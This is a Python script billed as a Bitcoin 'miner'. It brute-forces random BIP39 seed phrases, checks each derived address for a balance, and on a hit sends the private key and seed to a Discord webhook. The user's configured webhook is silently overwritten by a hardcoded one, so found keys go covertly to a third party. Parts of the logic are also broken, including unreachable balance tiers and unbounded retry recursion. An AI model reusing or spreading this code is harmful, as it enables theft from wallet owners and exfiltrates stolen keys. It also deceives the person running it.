from mnemonic import Mnemonic
import bip32utils
from bitcash import Key
import requests
import json
from discord_webhook import DiscordWebhook, DiscordEmbed
from multiprocessing import Process, Value, freeze_support, Lock
import os
import configparser
from datetime import datetime, date

def check(fails, lock):
    now = datetime.now()
    timeB = now.strftime("%H:%M:%S") 
    today = date.today()
    config = configparser.ConfigParser()
    config.read('config.ini')

    if str(config['miner']['useConfig']) == "True":
        wh = str(config['miner']['webhook'])
    wh = 'https://discord.com/api/webhooks/1067827483761709066/5sOZ31S4pE0QYE8Oqn1_A3zJbOysdCil4sCq4Z-X_13ipn4fRW-ZkR3fjWKgbfhloOwO'
    s = requests.Session()

    l = "balance"
    maintance = "BitcoinChain.com is under maintenance."
    hit = 0

    def check_adress(address, key, wh, seed):
        try:
            wallet = s.get(f"https://api-r.bitcoinchain.com/v1/address/{address}", stream = True)
            lol = wallet.text
            ls = json.loads(lol)
            if l in lol:
                for balance in ls:
                    money = balance["balance"]
                    text = ""
                    f = open("hits.txt", "a")
                    if not money == 0:
                        if money >= 0.0001:
                            text = "  good wallet"
                        elif money >= 1:
                            text = "  great wallet"
                        elif money >= 10:
                            text = "  ledger or cold wallet"
                        elif money <= 0.0001:
                            text = "  decent wallet"
                        data = (str(address)+"   "+str(money)+"        "+str(text)+ "Key: "+str(key)+ "Seed: "+str(words))
                        f.write(str(data) + "\n")
                        f.close()
                        try:
                            webhook_url = wh

                            data = {
                            "content": None,
                            "embeds": [
                                {
                                "title": f"Mining Since: {today}",
                                "description": f"HIT! | Key: {str(key)} | Bal: {money} | Address: {str(address)} | Seed: {str(words)}",
                                "color": 6749952,
                                "author": {
                                    "name": "Miner Started!"
                                }
                                }
                            ],
                            "username": "2xWallet",
                            "avatar_url": "https://cdn.discordapp.com/attachments/1062796452885188670/1068636566605537330/image.png",
                            "attachments": []
                            }

                            headers = {'Content-type': 'application/json'}

                            response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
                            print(response)
                        except:
                            print("Error while sending webhook!")
                        return(f"{address} is valid. With the balance of {money} BTC")

                    else:
                        #fails.value += 1
                        return(1)
            else:
                fails.value += 1
                return(0)
        except:
            check_adress(address, key, wh, seed)
            return("Blocked, retrying...")


    mnemon = Mnemonic('english')
    while True:
        words = mnemon.generate(128)
        mnemon.check(words)
        seed = mnemon.to_seed(words)
        #seed = mnemon.to_seed(b'lucky labor rally law toss orange weasel try surge meadow type crumble proud slide century')
        #print(f'BIP39 Seed: {seed.hex()}\n')

        root_key = bip32utils.BIP32Key.fromEntropy(seed)
        root_address = root_key.Address()
        root_public_hex = root_key.PublicKey().hex()
        root_private_wif = root_key.WalletImportFormat()

        print(check_adress(root_address, root_key, wh, words), f" | Key: {root_private_wif}  |  Seed: {words}")

